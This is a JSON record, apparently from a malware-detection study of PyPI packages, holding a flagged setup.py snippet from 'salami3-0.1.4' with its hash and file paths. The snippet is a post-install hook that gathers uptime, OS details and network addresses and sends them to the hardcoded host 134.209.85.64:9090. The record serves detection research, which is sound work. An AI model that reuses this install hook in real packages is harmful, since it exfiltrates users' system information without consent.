[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import socket\nimport platform\nimport psutil\nfrom setuptools.command.install import install\n\ndef createfile():\n    with open(\"/proc/uptime\", \"r\") as f:\n        uptime = f.read().split(\" \")[0].strip()\n\n    uptime = int(float(uptime))\n    uptime_hours = uptime // 3600\n    uptime_minutes = (uptime % 3600) // 60\n    uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n    systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", psutil.net_if_addrs())\n    sendable_string = f\"{uptime} --- {systeminfo}\"\n    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    clientSocket.connect((\"134.209.85.64\",9090))\n    clientSocket.send(str(sendable_string).encode())\n\nclass PostInstallCommand(install):\n     def run(self):\n         createfile()\n         install.run(self)",
    "hash_value": "0cd5b3f59e3bfb8c39620d0111e408f5"
  },
  {
    "metadata": {
      "package_name": "salami3-0.1.4",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/salami3-0.1.4.txt",
      "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/salami3-0.1.4/salami3-0.1.4/setup.py",
      "code_hash": "0cd5b3f59e3bfb8c39620d0111e408f5"
    }
  }
]